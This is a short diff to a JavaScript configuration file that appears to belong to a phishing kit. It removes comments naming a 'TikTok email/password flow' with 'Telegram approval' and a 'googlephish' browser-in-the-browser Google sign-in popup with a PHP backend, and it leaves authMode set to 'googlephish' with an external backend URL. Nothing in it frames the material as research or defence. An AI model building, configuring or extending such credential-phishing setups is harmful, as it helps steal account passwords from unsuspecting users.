@@ -1,6 +1,4 @@
 window.APP_CONFIG = {
-    // "api"        → TikTok email/password flow via our backend + Telegram approval
-    // "googlephish" → Google sign-in via BITB popup (PHP backend)
     authMode: 'googlephish',
 
     apiBaseUrl: 'https://tk-ap.onrender.com',
